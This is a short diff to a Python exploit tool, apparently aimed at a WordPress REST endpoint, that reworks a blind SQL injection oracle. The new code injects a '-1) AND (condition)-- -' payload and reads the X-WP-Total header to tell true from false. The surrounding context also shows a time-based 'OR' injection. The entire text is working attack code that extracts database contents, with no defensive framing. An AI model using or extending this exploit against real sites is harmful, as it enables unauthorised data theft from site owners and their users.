@@ -120,9 +120,14 @@ class BlindSQLi:
         return self.client.inject(f"0) OR {sql}-- -").elapsed
 
     def _true(self, condition: str) -> bool:
-        # get_items() returns rows only when the appended boolean condition holds.
+        # Read X-WP-Total (matched-row count), not the body: the item-route source sends no `page`,
+        # so the confused get_items() paginates to an empty body even when rows match. `NOT IN (-1)`
+        # matches every post, so a true condition counts all posts (>0) and a false one counts none.
         self.requests += 1
-        return bool(self.client.rows(self.client.inject(f"0) AND ({condition})-- -")))
+        count = self.client.match_count(self.client.inject(f"-1) AND ({condition})-- -"))
+        if count is None:
+            raise RuntimeError("blind SQLi oracle did not return X-WP-Total")
+        return count > 0
 
 
 class ErrorBasedSQLi:
